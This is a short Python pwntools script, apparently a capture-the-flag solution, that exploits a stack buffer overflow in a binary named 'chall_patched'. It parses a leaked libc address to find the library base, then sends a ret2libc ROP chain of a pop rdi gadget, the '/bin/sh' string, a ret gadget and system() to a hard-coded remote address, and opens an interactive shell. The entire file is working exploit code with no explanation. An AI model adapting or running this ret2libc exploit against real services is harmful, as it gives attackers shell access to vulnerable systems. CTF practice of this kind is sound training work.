from pwn import *

gs = '''
continue
'''

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("83.136.252.167", 40382)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

offset = 40

#rop = ROP(libc)
#ret_gadget = rop.find_gadget(['ret'])[0]
#pop_rdi_gadget = rop.find_gadget(['pop rdi'])[0]

io.recvuntil(b"+0x28 | ")

leak_libc_main_address = int(io.recv(18).decode(), 16) # Ese 0x30 es la diferencia distancia entre libc y lo que se muestra en pantalla

leak_libc_main_address -= 128

#print(hex(leak_libc_main_address))


libc.address = leak_libc_main_address - libc.symbols.__libc_start_call_main

system_libc = libc.symbols.system

libc_bin_sh = next(libc.search(b'/bin/sh'))

print(f"Libc Base: {hex(libc.address)}")


pop_rdi_gadget = libc.address + 0x2a3e5
#pop_rdi_gadget = next(libc.search(asm("pop rdi ; ret"), executable=True))
#pop_rdi_gadget += next(libc.search(asm("ret"), executable=True))

ret_gadget = 0x000000000040101a
#pop_rdi_gadget =

print(f"System: {hex(system_libc)}")
print(f"Bin sh: {hex(libc_bin_sh)}")

#print(hex(ret_gadget))
#print(hex(pop_rdi_gadget))
payload = b"".join([
    b"A"*offset,
    p64(pop_rdi_gadget),
    p64(libc_bin_sh),
    p64(ret_gadget),
    p64(system_libc)
])

io.send(payload.ljust(128, b"\x00"))

io.interactive()
